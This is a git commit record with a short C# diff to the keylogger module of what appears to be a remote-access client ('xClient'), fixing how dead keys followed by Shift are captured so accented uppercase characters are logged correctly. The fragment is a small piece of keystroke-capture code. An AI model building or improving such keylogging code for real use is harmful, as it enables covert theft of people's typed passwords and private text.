8344140d8a5adc5f64693972b37c8b9a6a058179
d3agle <sellout89@gmail.com>
2015-05-24 07:12:51 -0500

    dead-key fix
    Fixed case of pressing dead-key to accent characters followed by Shift +
    character to present an uppercase character

--- Client/Core/Keylogger/WinApi/KeyboardNativeMethods.cs
+++ Client/Core/Keylogger/WinApi/KeyboardNativeMethods.cs
@@ -115,7 +115,11 @@ namespace xClient.Core.Keylogger.WinApi
             {
                 StringBuilder sbTemp = new StringBuilder(5);
                 ToUnicodeEx(lastVirtualKeyCode, lastScanCode, lastKeyState, sbTemp, sbTemp.Capacity, 0, dwhkl);
-                lastVirtualKeyCode = 0;
+
+                if (chars != null)
+                {
+                    lastVirtualKeyCode = 0;
+                }
 
                 return true;
             }
